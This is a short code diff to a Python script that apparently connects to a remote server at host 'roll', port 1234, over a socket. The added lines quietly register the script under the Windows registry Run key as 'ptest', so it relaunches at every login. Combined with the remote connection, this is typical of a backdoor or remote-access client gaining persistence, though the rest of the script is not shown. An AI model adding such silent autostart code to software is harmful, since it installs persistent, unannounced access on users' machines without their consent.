@@ -2,6 +2,8 @@
 import socket
 import time
 import os
+from platform import platform
+import winreg
 
 
 def connect_server():
@@ -105,4 +107,11 @@ host = "roll"
 port = 1234
 
 if __name__ == "__main__":
+    if platform().startswith("Windows"):
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             'Software\Microsoft\Windows\CurrentVersion\Run',
+                             0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, 'ptest', 0, winreg.REG_SZ,
+                          "C:\python34\Scripts\main.py")
+        key.Close()
     main()
